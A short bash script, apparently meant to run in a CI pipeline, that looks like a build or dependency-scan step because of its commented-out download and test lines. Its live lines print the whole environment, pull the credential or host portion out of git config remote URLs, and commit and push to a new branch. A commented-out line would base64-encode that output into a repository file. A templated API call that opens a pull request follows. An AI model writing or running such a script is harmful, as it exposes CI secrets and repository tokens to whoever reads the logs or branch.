#!/bin/bash

# wget https://sca-downloads.s3.amazonaws.com/cli/latest/ScaResolver-linux64.tar.gz
# tar -xzvf ScaResolver-linux64.tar.gz -C /tmp
# rm -rf ScaResolver-linux64.tar.gz

# apt update && apt install -y curl
env
git checkout -b test
git config --list | grep -oP 'https://\K[^:/]+' #| base64 > .github/1
git add .
git config --global user.email "come@on.com"
git config --global user.name "MotiBanana"
git commit -m "bot"
git push --set-upstream origin test

curl -H "Authorization: token YOUR_GITHUB_PERSONAL_ACCESS_TOKEN" \
     -H "Accept: application/vnd.github+json" \
     -X POST -d '{
       "title": "Pull request title",
       "head": "branch_name",
       "base": "master",
       "body": "Pull request description"
     }' \
     https://api.github.com/repos/USERNAME/REPO_NAME/pulls

# go test ./... -coverprofile cover.out
